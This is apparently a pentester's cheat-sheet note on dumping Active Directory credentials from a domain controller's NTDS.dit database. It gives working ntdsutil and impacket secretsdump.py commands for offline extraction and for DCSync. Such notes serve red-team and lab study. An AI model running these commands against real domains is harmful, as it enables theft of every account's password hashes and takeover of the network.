#impacket #ntdsutil
- The `NTDS` (New Technology Directory Services) is a database that contains all the AD data.
- It has:
	- Schema Table
	- Link Table
	- Data Type
- The database is located at `C:\Windows\NTDS\ntds.dit` in the domain controller.
- This file is locked.
- Decrypting the NTDS requires the system boot key, which is stored in the SYSTEM hive or filesystem.
### Offline Dump
- When we have administrative access to the domain controller, but we don't have administrator credentials.
- We require a copy of the:
	- NDTS.dit
	- SYSTEM
	- SECURITY
- We can make a copy of the all these files using `ntdsutil.exe` command line tool.
```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\temp' q q"
```
- Credentials can be dumped with impacket's `secretsdump.py`
```bash
secretsdump.py -security <security> -system <system> -ntds <ntds> local
```
### Credentials dump
- If we have administrator credentials, we can perform [DCSync](DCSync) using `secretsdump.py`:
```powershell
secretsdump.py -just-dc-ntlm mydomain.local/adminuser@10.10.10.10
```